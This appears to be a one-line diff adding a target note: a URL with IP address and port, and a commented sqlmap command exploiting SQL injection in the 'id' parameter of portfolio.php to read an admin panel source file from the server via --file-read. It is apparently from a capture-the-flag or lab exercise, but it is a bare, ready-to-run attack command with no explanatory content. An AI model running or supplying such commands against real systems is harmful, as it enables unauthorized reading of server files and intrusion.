@@ -1,0 +1,1 @@
+http://165.232.101.10:32220/portfolio.php?id=1 (GET)  # /usr/bin/sqlmap -u http://165.232.101.10:32220/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php
